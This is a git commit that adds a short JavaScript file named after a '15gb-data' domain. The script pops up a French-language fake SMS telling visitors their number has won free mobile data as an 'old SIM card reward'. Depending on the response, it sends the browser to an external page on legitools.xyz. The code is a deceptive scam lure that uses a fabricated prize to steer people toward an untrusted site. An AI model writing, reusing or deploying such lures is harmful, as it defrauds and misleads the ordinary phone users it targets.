b9d080546172414f84008875181d49d1078e955d
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-06 09:11:02 -0800

    Create 15gb-data.com.js

---
+++ 15gb-data.com.js
@@ -0,0 +1,5 @@
+var password = 'Données gratuites pour les anciens Sims'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir des données gratuites ANCIENNE CARTE SIM RÉCOMPENSE, veuillez appuyer sur OK pour ACTIVER. ','Données gratuites pour les anciens Sims');
+if (password != 'Données gratuites pour les anciens Sims') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
